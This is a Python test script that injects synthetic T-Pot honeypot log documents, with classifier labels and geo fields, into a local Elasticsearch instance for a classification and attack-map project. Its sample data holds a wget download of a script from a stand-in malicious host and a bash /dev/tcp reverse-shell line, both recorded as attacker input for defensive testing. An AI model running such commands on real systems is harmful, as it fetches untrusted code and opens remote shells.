"""Inject synthetic T-Pot-shaped documents into a local ES.

Each doc mirrors the schema produced by T-Pot's logstash filter:
  type, src_ip, dest_ip, dest_port, protocol, eventid, command, login_attempts,
  @timestamp ...

Docs are also geo-enriched (``geoip``, ``geoip_ext``, ``t-pot_hostname``) so the
T-Pot attack map works. ``map_data``'s DataServer_v2.py filters on
``exists: geoip.ip`` and then reads ``geoip.{latitude,longitude,country_name,
country_code2,continent_code}``, ``geoip_ext.{latitude,longitude,ip}`` and
``t-pot_hostname`` — without those the globe renders but stays empty.

Usage:
  python integration-tests/inject_sample_docs.py [--count 50] [--host http://127.0.0.1:19200]
  python integration-tests/inject_sample_docs.py --no-geo   # geo 필드 없이 (구 동작)
"""
from __future__ import annotations

import argparse
import json
import random
import sys
import urllib.request
from datetime import datetime, timedelta, timezone


SAMPLES = [
    # (label-we-expect, partial doc)
    ("Brute Force", {
        "type": "Cowrie", "protocol": "ssh", "eventid": "cowrie.login.failed",
        "username": "root", "password": "123456", "login_attempts": 25,
        "src_ip": "203.0.113.10", "dest_port": 22,
    }),
    ("Recon", {
        "type": "ConPot", "protocol": "PORTSCAN", "eventid": "scan",
        "src_ip": "198.51.100.5", "dest_port": 502,
    }),
    ("Malware", {
        "type": "Cowrie", "protocol": "ssh", "eventid": "cowrie.command.input",
        "input": "wget http://malicious.example.com/x.sh -O /tmp/x.sh",
        "src_ip": "203.0.113.55", "dest_port": 22,
    }),
    ("Intrusion", {
        "type": "Cowrie", "protocol": "ssh", "eventid": "cowrie.command.input",
        "input": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "src_ip": "203.0.113.99", "dest_port": 22,
    }),
    ("Etc", {
        "type": "Heralding", "protocol": "http", "eventid": "auth",
        "username": "admin", "password": "admin", "login_attempts": 1,
        "src_ip": "192.0.2.20", "dest_port": 80,
    }),
]


# ── geo enrichment ────────────────────────────────────────────────────────
# The sensor's own location (map arc destination). T-Pot fills this from the
# host's public IP; here it is fixed to Seoul so arcs converge on Korea.
SENSOR = {
    "hostname": "capstone-tpot",
    "ip": "203.0.113.1",
    "latitude": 37.5665,
    "longitude": 126.9780,
    "country_name": "South Korea",
    "country_code2": "KR",
    "continent_code": "AS",
}

# Attacker origins keyed by the src_ip used in SAMPLES, so a given source IP
# always maps to the same place (the map dedups arcs by coordinates).
ORIGINS = {
    "203.0.113.10": ("China",         "CN", "AS", 39.9042,  116.4074),
    "198.51.100.5": ("Russia",        "RU", "EU", 55.7558,   37.6173),
    "203.0.113.55": ("Netherlands",   "NL", "EU", 52.3676,    4.9041),
    "203.0.113.99": ("Brazil",        "BR", "SA", -23.5505, -46.6333),
    "192.0.2.20":   ("United States", "US", "NA", 37.7749, -122.4194),
}


def geo_fields(src_ip: str) -> dict:
    """Return the geoip/geoip_ext/hostname block the attack map needs."""
    country, code2, continent, lat, lon = ORIGINS.get(
        src_ip, ("Germany", "DE", "EU", 50.1109, 8.6821)
    )
    return {
        "geoip": {
            "ip": src_ip,
            "latitude": lat,
            "longitude": lon,
            "location": {"lat": lat, "lon": lon},
            "country_name": country,
            "country_code2": code2,
            "country_code3": code2,
            "continent_code": continent,
        },
        "geoip_ext": {
            "ip": SENSOR["ip"],
            "latitude": SENSOR["latitude"],
            "longitude": SENSOR["longitude"],
            "location": {"lat": SENSOR["latitude"], "lon": SENSOR["longitude"]},
            "country_name": SENSOR["country_name"],
            "country_code2": SENSOR["country_code2"],
            "continent_code": SENSOR["continent_code"],
        },
        "t-pot_hostname": SENSOR["hostname"],
        "t-pot_ip_ext": SENSOR["ip"],
        "dest_ip": SENSOR["ip"],
        "ip_rep": "known attacker",
    }


def post_bulk(host: str, body: str) -> dict:
    req = urllib.request.Request(
        f"{host}/_bulk",
        data=body.encode("utf-8"),
        headers={"Content-Type": "application/x-ndjson"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read())


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="http://127.0.0.1:19200")
    ap.add_argument("--count", type=int, default=50)
    ap.add_argument("--no-geo", action="store_true",
                    help="geoip/geoip_ext 를 넣지 않는다 (어택맵에 표시되지 않음)")
    args = ap.parse_args()

    today = datetime.now(timezone.utc)
    index = f"logstash-{today.strftime('%Y.%m.%d')}"

    lines = []
    for i in range(args.count):
        label, base = random.choice(SAMPLES)
        ts = today - timedelta(seconds=random.randint(0, 60))
        doc = dict(base)
        if not args.no_geo:
            doc.update(geo_fields(doc.get("src_ip", "")))
            doc["src_port"] = random.randint(1024, 65535)
        doc["@timestamp"] = ts.isoformat()
        doc["timestamp"] = doc["@timestamp"]
        doc["_expected_label"] = label  # for human verification, not used by classifier
        lines.append(json.dumps({"index": {"_index": index}}))
        lines.append(json.dumps(doc))

    body = "\n".join(lines) + "\n"
    resp = post_bulk(args.host, body)
    errors = resp.get("errors", False)
    n_ok = sum(1 for it in resp.get("items", []) if "index" in it and it["index"].get("status", 0) < 300)
    geo = "no-geo" if args.no_geo else "geo-enriched"
    print(f"injected {n_ok}/{args.count} docs into {index} ({geo}), errors={errors}")
    return 0 if not errors else 1


if __name__ == "__main__":
    sys.exit(main())
